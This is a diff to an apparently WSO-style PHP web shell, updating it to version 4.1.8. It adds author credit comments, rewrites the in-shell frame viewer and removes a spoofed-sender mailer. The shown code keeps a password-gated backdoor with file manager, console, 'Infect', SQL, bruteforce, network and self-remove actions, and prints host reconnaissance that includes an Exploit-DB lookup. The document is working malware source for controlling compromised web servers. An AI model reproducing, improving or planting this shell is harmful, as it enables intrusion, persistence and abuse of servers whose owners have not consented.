@@ -23,7 +23,7 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.1.7');
+@define('VERSION', '4.1.8');
 if(get_magic_quotes_gpc()) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -31,6 +31,7 @@ if(get_magic_quotes_gpc()) {
 	$_POST = stripslashes_array($_POST);
     $_COOKIE = stripslashes_array($_COOKIE);
 }
+/* (С) 11.2011 oRb */
 if(!empty($▛)) {
     if(isset($_POST['pass']) && (md5($_POST['pass']) == $▛))
         prototype(md5($_SERVER['HTTP_HOST']), $▛);
@@ -55,6 +56,7 @@ if($os == 'win') {
 }
 if($cwd[strlen($cwd)-1] != '/')
 	$cwd .= '/';
+/* (С) 04.2015 Pirat */
 function hardHeader() {
 	if(empty($_POST['charset']))
 		$_POST['charset'] = $GLOBALS['▜'];
@@ -189,7 +191,7 @@ function hardHeader() {
 	$opt_charsets = '';
 	foreach($charsets as $▟)
 		$opt_charsets .= '<option value="'.$▟.'" '.($_POST['charset']==$▟?'selected':'').'>'.$▟.'</option>';
-	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Mailer'=>'Mailer','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
+	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
 	if(!empty($GLOBALS['▛']))
 	$m['Logout'] = 'Logout';
 	$m['Self remove'] = 'SelfRemove';
@@ -202,6 +204,7 @@ function hardHeader() {
 		if (is_dir($drive.':\\'))
 			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
 	}
+	/* (С) 08.2015 dmkcv */
 	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'.
 		 '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="' . $explink . '" target=_blank>[ Exploit-DB ]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . viewSize($totalSpace) . ' <span>Free:</span> ' . viewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. viewPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>'.
 		 '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . gethostbyname($_SERVER["HTTP_HOST"]) . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>'.
@@ -265,7 +268,7 @@ function hardLogin() {
 		  exit;
 		  }
 		}
-	die("<pre align=center><form method=post style='font-family:fantasy;'>Password: <input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;'><input type=submit value='>>' style='border:none;background-color:#FFDB5F;color:#fff;'></form></pre>");
+	die("<pre align=center><form method=post style='font-family:fantasy;'>Password: <input type=password name=pass style='background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit value='>>' style='border:none;background-color:#FFDB5F;color:#fff;'></form></pre>");
 }
 function viewSize($s) {
 	if($s >= 1073741824)
@@ -560,8 +563,15 @@ function actionFilesTools() {
 			clearstatcache();
 			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.touch.value);return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"><input type=submit value=">>"></form>';
 			break;
+		/* (С) 12.2015 mitryz */
 		case 'frame':
-			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.name.value);return false;"><iframe width="100%" height="900px" scrolling="no" src='.'/'.htmlspecialchars($_POST['p1']).' onload="onload=height=contentDocument.body.scrollHeight"></iframe></form>';
+			$frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));
+			if ($frameSrc[0] != '/')
+				$frameSrc = '/' . $frameSrc;
+			if ($frameSrc[strlen($frameSrc) - 1] != '/')
+				$frameSrc = $frameSrc . '/';
+			$frameSrc = $frameSrc . htmlspecialchars($_POST['p1']);
+			echo '<iframe width="100%" height="900px" scrolling="no" src='.$frameSrc.' onload="onload=height=contentDocument.body.scrollHeight"></iframe>';
 			break;
 	}
 	echo '</div>';
@@ -732,20 +742,6 @@ function actionPhp() {
 		echo htmlspecialchars(ob_get_clean());
 	}
 	echo '</pre></div>';
-	hardFooter();
-}
-function actionMailer() {
-	hardHeader();
-	echo '<h1>Mailer</h1><div class=content>
-	<form method=post><table cellpadding="1" cellspacing="0">
-	<tr><td width="1%">To:</td><td><input type=email name=to style="width:50%" placeholder="myemail@gmail.com" required></td></tr>
-	<tr><td>From:</td><td><input type=email name=from style="width:50%" placeholder="barackobama@nsa.gov" required></td></tr></table>';
-	echo '</div>';
-	echo '<div class=content>
-	<input type=text name=subject style="width:100%" placeholder="Subject" required>
-	<textarea type=text name=body style="margin-top:2px" class=bigarea placeholder="Hello, world!"></textarea>
-	<input type=submit value="Send" style="margin-top:5px"></form>';
-	echo '</div>';
 	hardFooter();
 }
 if (isset($_POST['to']) && isset($_POST['from']) && isset($_POST['subject']) && isset($_POST['body'])) {
